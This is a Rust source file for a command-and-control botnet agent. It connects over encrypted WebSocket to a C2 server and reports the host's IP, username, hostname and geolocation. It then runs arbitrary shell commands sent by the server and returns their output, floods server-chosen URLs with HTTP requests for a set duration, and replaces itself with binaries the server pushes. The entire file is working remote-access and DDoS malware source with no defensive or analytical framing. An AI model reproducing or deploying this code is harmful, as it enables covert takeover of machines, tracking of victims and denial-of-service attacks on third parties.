use std::time::Duration;
use crate::handlers::models::{C2Message, Location};
use futures::prelude::*;
use hostname::get as hostname;
use reqwest::Client;
use serde_json::Value;
use std::os::unix::fs::PermissionsExt;
use tokio::process::Command;
use tokio::time::timeout;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::{MaybeTlsStream, WebSocketStream};
use uuid::Uuid;
use chacha20poly1305::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    XChaCha20Poly1305, XNonce,
};
use base64;

pub struct Agent {
    uuid: String,
    ws: WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
    client: Client,
    agent_key: [u8; 32],
}

const AGENT_VERSION: &str = "1.0.1"; // Current agent version
// Hardcoded key (Base64-encoded, decodes to 32 bytes)
const AGENT_PRIVATE_KEY_B64: &str = "k3V9a2J4cXV4cXV5end1dHNlY3VyZWRrZXkxMjM0NTY=";

fn is_agent_up_to_date(version: &str) -> bool {
    version == AGENT_VERSION
}

impl Agent {
    pub async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        // Decode hardcoded key
        let agent_key = base64::decode(AGENT_PRIVATE_KEY_B64).map_err(|e| format!("Failed to decode hardcoded AGENT_PRIVATE_KEY: {}", e))?;
        let agent_key: [u8; 32] = agent_key.try_into().map_err(|_| "Hardcoded key has invalid length (must be 32 bytes)")?;

        let mut uuid = String::new();
        let config_dir = match dirs::home_dir() {
            Some(path) => path.join(".unique_id"),
            None => {
                uuid = Uuid::new_v4().to_string();
                eprintln!(
                    "Could not find home directory. Generating random UUID: {}",
                    uuid
                );
                return Err("Could not find home directory".into());
            }
        };

        if !config_dir.exists() {
            uuid = Uuid::new_v4().to_string();
            std::fs::write(&config_dir, &uuid)?;
            eprintln!("Generated and saved new UUID: {}", uuid);
        } else {
            uuid = std::fs::read_to_string(&config_dir)?;
            eprintln!("Loaded UUID from file: {}", uuid);
        }

        let client = Client::builder().timeout(Duration::from_secs(15)).build()?;
        let (ws, _) = tokio_tungstenite::connect_async("ws://localhost:80/c2").await?;

        Ok(Agent { uuid, ws, client, agent_key })
    }

    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        loop {
            // Send VersionCheck on connection
            let version_check_msg = serde_json::to_string(&C2Message::VersionCheck {
                uuid: self.uuid.clone(),
                agent_version: AGENT_VERSION.to_string(),
            })?;
            eprintln!(
                "Agent {} sending VersionCheck: {}",
                self.uuid, version_check_msg
            );
            let encrypted = self.encrypt_message(&version_check_msg).await?;
            self.ws.send(Message::binary(encrypted)).await?;

            // Wait for VersionResponse or UpdateSoftwareWithBinary
            let mut version_checked = false;
            let mut attempts = 0;
            const MAX_ATTEMPTS: u32 = 3;

            while attempts < MAX_ATTEMPTS && !version_checked {
                attempts += 1;
                eprintln!(
                    "Agent {}: waiting for version response, attempt {}/{}",
                    self.uuid, attempts, MAX_ATTEMPTS
                );
                match timeout(Duration::from_secs(30), self.ws.next()).await {
                    Ok(Some(Ok(msg))) => {
                        eprintln!("Agent {}: received message from server", self.uuid);
                        let text = if msg.is_binary() {
                            let data = msg.into_data();
                            if data.len() < 24 {
                                eprintln!("Agent {}: invalid message length", self.uuid);
                                continue;
                            }
                            let nonce = XNonce::from_slice(&data[..24]);
                            let ciphertext = &data[24..];
                            let cipher = XChaCha20Poly1305::new(&self.agent_key.into());
                            match cipher.decrypt(nonce, ciphertext) {
                                Ok(plaintext) => String::from_utf8(plaintext).unwrap_or_default(),
                                Err(e) => {
                                    eprintln!("Agent {}: decryption error: {}", self.uuid, e);
                                    continue;
                                }
                            }
                        } else if let Ok(text) = msg.into_text() {
                            text
                        } else {
                            eprintln!("Agent {}: received non-text/binary message", self.uuid);
                            continue;
                        };

                        eprintln!("Agent {}: received text: {}", self.uuid, text);
                        if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                            match c2_msg {
                                C2Message::VersionResponse { version } => {
                                    eprintln!(
                                        "Agent {} received VersionResponse: version={}",
                                        self.uuid, version
                                    );
                                    if !is_agent_up_to_date(&version) {
                                        eprintln!("Version mismatch, waiting for update...");
                                        continue;
                                    }
                                    version_checked = true;
                                    let ack_msg = serde_json::to_string(&C2Message::VersionCheckAck {})?;
                                    eprintln!(
                                        "Agent {} sending VersionCheckAck: {}",
                                        self.uuid, ack_msg
                                    );
                                    let encrypted = self.encrypt_message(&ack_msg).await?;
                                    self.ws.send(Message::binary(encrypted)).await?;
                                    break;
                                }
                                C2Message::UpdateSoftwareWithBinary { version, binary } => {
                                    eprintln!("Received update for version {}", version);
                                    self.update_software(&version, binary).await?;
                                    return Err("Agent updated and restarting".into());
                                }
                                _ => {
                                    eprintln!(
                                        "Received unexpected message during version check: {:?}",
                                        c2_msg
                                    );
                                }
                            }
                        } else {
                            eprintln!(
                                "Agent {} failed to deserialize message: {}",
                                self.uuid, text
                            );
                        }
                    }
                    Ok(Some(Err(e))) => {
                        eprintln!(
                            "Agent {}: WebSocket error while waiting for version response: {}",
                            self.uuid, e
                        );
                        break;
                    }
                    Ok(None) => {
                        eprintln!(
                            "Agent {}: WebSocket stream closed while waiting for version response",
                            self.uuid
                        );
                        break;
                    }
                    Err(_) => {
                        eprintln!(
                            "Agent {}: timeout waiting for version response, attempt {}/{}",
                            self.uuid, attempts, MAX_ATTEMPTS
                        );
                    }
                }
            }

            if !version_checked {
                eprintln!("Failed to verify version after {} attempts", MAX_ATTEMPTS);
                tokio::time::sleep(Duration::from_secs(5)).await;
                continue;
            }

            // Send registration after version check with updated IP
            let ip = match self.client.get("https://api.ipify.org/").send().await {
                Ok(resp) => match resp.text().await {
                    Ok(ip) => {
                        eprintln!("Agent {} fetched IP: {}", self.uuid, ip);
                        ip
                    }
                    Err(e) => {
                        eprintln!("Agent {} failed to parse IP response: {}", self.uuid, e);
                        "Unknown".to_string()
                    }
                },
                Err(e) => {
                    eprintln!("Agent {} failed to fetch IP: {}", self.uuid, e);
                    "Unknown".to_string()
                }
            };

            let username = whoami::username();
            let hostname = hostname()?.to_string_lossy().to_string();

            // Attempt to fetch location with retries
            let mut location = Location {
                country: "Unknown".to_string(),
                city: "Unknown".to_string(),
                region: "Unknown".to_string(),
                latitude: 0.0,
                longitude: 0.0,
            };
            let max_retries = 2;
            for attempt in 1..=max_retries {
                let url = format!("https://freeipapi.com/api/json/{}", ip);
                match self.client.get(&url).send().await {
                    Ok(resp) => match resp.text().await {
                        Ok(text) => {
                            if let Ok(json) = serde_json::from_str::<Value>(&text) {
                                location = Location {
                                    country: json["countryName"].as_str().unwrap_or("Unknown").to_string(),
                                    city: json["cityName"].as_str().unwrap_or("Unknown").to_string(),
                                    region: json["regionName"].as_str().unwrap_or("Unknown").to_string(),
                                    latitude: json["latitude"].as_f64().unwrap_or(0.0),
                                    longitude: json["longitude"].as_f64().unwrap_or(0.0),
                                };
                                eprintln!("Agent {} fetched location: {:?}", self.uuid, location);
                                break;
                            } else {
                                eprintln!("Agent {} failed to parse location JSON (attempt {}/{}): {}", self.uuid, attempt, max_retries, text);
                            }
                        }
                        Err(e) => {
                            eprintln!("Agent {} failed to read location response (attempt {}/{}): {}", self.uuid, attempt, max_retries, e);
                        }
                    },
                    Err(e) => {
                        eprintln!("Agent {} failed to fetch location from {} (attempt {}/{}): {}", self.uuid, url, attempt, max_retries, e);
                        if attempt == max_retries {
                            eprintln!("Agent {} using default location after {} failed attempts", self.uuid, max_retries);
                        } else {
                            tokio::time::sleep(Duration::from_secs(1)).await;
                        }
                    }
                }
            }

            let register_msg = serde_json::to_string(&C2Message::AgentRegister {
                uuid: self.uuid.clone(),
                ip,
                username,
                hostname,
                country: location.country,
                city: location.city,
                region: location.region,
                latitude: location.latitude,
                longitude: location.longitude,
                version: AGENT_VERSION.to_string(),
            })?;
            eprintln!(
                "Agent {} sending register message: {}",
                self.uuid, register_msg
            );
            let encrypted = self.encrypt_message(&register_msg).await?;
            self.ws.send(Message::binary(encrypted)).await?;

            // Process server messages
            while let Some(msg) = self.ws.next().await {
                match msg {
                    Ok(msg) => {
                        let text = if msg.is_binary() {
                            let data = msg.into_data();
                            if data.len() < 24 {
                                eprintln!("Agent {}: invalid message length", self.uuid);
                                continue;
                            }
                            let nonce = XNonce::from_slice(&data[..24]);
                            let ciphertext = &data[24..];
                            let cipher = XChaCha20Poly1305::new(&self.agent_key.into());
                            match cipher.decrypt(nonce, ciphertext) {
                                Ok(plaintext) => String::from_utf8(plaintext).unwrap_or_default(),
                                Err(e) => {
                                    eprintln!("Agent {}: decryption error: {}", self.uuid, e);
                                    continue;
                                }
                            }
                        } else if let Ok(text) = msg.into_text() {
                            text
                        } else {
                            eprintln!("Agent {}: received non-text/binary message", self.uuid);
                            continue;
                        };

                        if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                            match c2_msg {
                                C2Message::Ping => {
                                    let pong_msg = serde_json::to_string(&C2Message::Pong)?;
                                    let encrypted = self.encrypt_message(&pong_msg).await?;
                                    self.ws.send(Message::binary(encrypted)).await?;
                                }
                                C2Message::Command { uuid, cmd } => {
                                    if uuid == self.uuid {
                                        if let Ok(json) = serde_json::from_str::<Value>(&cmd) {
                                            if json["action"] == "access" {
                                                let url = json["url"].as_str().unwrap_or("");
                                                let secs = json["duration_secs"].as_u64().unwrap_or(0);
                                                let end_time = std::time::Instant::now()
                                                    + Duration::from_secs(secs);
                                                while std::time::Instant::now() < end_time {
                                                    let _ = self.client.get(url).send().await;
                                                }
                                            } else {
                                                let output = Command::new("sh")
                                                    .arg("-c")
                                                    .arg(&cmd)
                                                    .output()
                                                    .await?;
                                                let output_str = String::from_utf8_lossy(&output.stdout).to_string();
                                                let response_msg = serde_json::to_string(&C2Message::CommandResponse { output: output_str })?;
                                                let encrypted = self.encrypt_message(&response_msg).await?;
                                                self.ws.send(Message::binary(encrypted)).await?;
                                            }
                                        }
                                    }
                                }
                                C2Message::Broadcast { cmd } => {
                                    if let Ok(json) = serde_json::from_str::<Value>(&cmd) {
                                        if json["action"] == "access" {
                                            let url = json["url"].as_str().unwrap_or_default();
                                            let secs = json["duration_secs"].as_u64().unwrap_or(0);
                                            let end_time = std::time::Instant::now()
                                                + Duration::from_secs(secs);
                                            while std::time::Instant::now() < end_time {
                                                let _ = self.client.get(url).send().await;
                                                tokio::time::sleep(Duration::from_millis(100)).await;
                                            }
                                        } else {
                                            let output: std::process::Output = Command::new("sh")
                                                .arg("-c")
                                                .arg(&cmd)
                                                .output()
                                                .await?;
                                            let output = String::from_utf8_lossy(&output.stdout).to_string();

                                            let response_msg = serde_json::to_string(&C2Message::CommandResponse { output })?;
                                            let encrypted = self.encrypt_message(&response_msg).await?;
                                            self.ws.send(Message::binary(encrypted)).await?;
                                        }
                                    }
                                }
                                C2Message::UpdateSoftwareWithBinary { version, binary } => {
                                    self.update_software(&version, binary).await?;
                                    return Err("Agent updated and restarting".into());
                                }
                                _ => {}
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("WebSocket error: {}", e);
                        break;
                    }
                }
            }

            eprintln!("WebSocket connection closed. Retrying in 5 seconds...");
            tokio::time::sleep(Duration::from_secs(5)).await;
            let (ws, _) = tokio_tungstenite::connect_async("ws://localhost:80/c2").await?;
            self.ws = ws;
        }
    }

    async fn update_software(
        &mut self,
        version: &str,
        binary: Vec<u8>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp_path = "/tmp/agent_new";
        std::fs::write(temp_path, binary)?;

        let mut perms = std::fs::metadata(temp_path)?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(temp_path, perms)?;

        let current_exe = std::env::current_exe()?;

        let pid = std::process::id();
        let current_exe_path = current_exe.to_string_lossy().replace(" (deleted)", "");

        let command = format!(
            "sleep 3; kill {} ; mv '{}' '{}' ; '{}'",
            pid, temp_path, current_exe_path, current_exe_path
        );

        println!("Executing command: {}", command);

        Command::new("sh").arg("-c").arg(command).spawn()?;

        std::process::exit(0);
    }

    async fn encrypt_message(&self, message: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let cipher = XChaCha20Poly1305::new(&self.agent_key.into());
        let nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
        let mut ciphertext = cipher.encrypt(&nonce, message.as_bytes()).unwrap();
        let mut result = nonce.to_vec();
        result.append(&mut ciphertext);
        Ok(result)
    }
}